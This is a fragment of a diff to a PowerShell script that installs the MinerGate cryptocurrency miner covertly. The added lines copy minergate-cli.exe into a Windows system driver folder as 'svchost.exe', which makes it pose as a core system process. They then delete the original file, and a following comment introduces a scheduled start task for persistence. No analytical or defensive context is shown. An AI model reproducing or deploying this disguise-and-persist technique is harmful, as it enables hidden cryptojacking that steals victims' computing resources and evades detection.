@@ -28,8 +28,12 @@ Rename-Item $oldpath.name etc
 Remove-Item MG.zip
 
 
-# Rename exe
+# Create renamed copy of Miner
 Copy-Item C:\Windows\System32\drivers\en-US\etc\minergate-cli.exe C:\Windows\System32\drivers\en-US\etc\svchost.exe
+
+
+#Delete Miner
+Remove-Item C:\Windows\System32\drivers\en-US\etc\minergate-cli.exe
 
 
 # Create scheduled Start Task
